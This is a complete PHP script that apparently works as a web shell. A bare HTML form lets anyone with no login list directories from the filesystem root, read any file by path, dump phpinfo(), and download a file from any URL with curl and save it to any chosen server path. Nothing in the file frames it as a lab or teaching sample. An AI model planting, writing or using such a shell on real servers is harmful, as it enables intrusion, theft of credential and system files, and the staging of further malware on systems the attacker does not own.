<?php

function getAddress() {
    $protocol = $_SERVER['HTTPS'] == 'on' ? 'https' : 'http';
    return $protocol.'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
}

if(isset($_POST['SubmitButton'])){
  $input = $_POST['inputText'];
  $message = "Success! You entered: ".$input;
  $directories = glob($input."*", GLOB_MARK|GLOB_BRACE);
  //print_r($directories);
  $adr = $input;
}elseif($_POST['SubmitButtonFile']){
  $input = $_POST['inputText'];
  $file = file_get_contents($input,TRUE);
  echo "<pre>".$file."</pre>";

}elseif($_POST['phpinfo']){
  phpinfo();
}elseif($_POST['upload']){
$url  = $_POST['inputText'];
$path = $_POST['saveloc'];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$data = curl_exec($ch);

curl_close($ch);

file_put_contents($path, $data);
}else{
  $directories = glob('/*', GLOB_MARK|GLOB_BRACE);
//  print_r($directories);
  $adr = "/";
}

echo '<ul>';
foreach($directories as $p){
 echo '<li>'.$p.'</li>';
}
echo '</ul>';

?>
<hr></hr>
<pre>
Will be posted to: <?php echo getAddress();?>
</pre>
<pre>
Current Dir: <?php echo getcwd(); ?>
</pre>

<form action="<?php echo getAddress();?>" method="post">
<input type="textbox" name="inputText" value="<?php echo $adr; ?>">
<input type="submit" name="SubmitButton" value="List Dir" />
<input type="submit" name="SubmitButtonFile" value="Read File" />
<input type="submit" name="phpinfo" value="PHP Info" />
<input type="submit" name="upload" value="Upload Remote File" />
<input type="textbox" name="saveloc" value="Upload Save Location" />
</form>
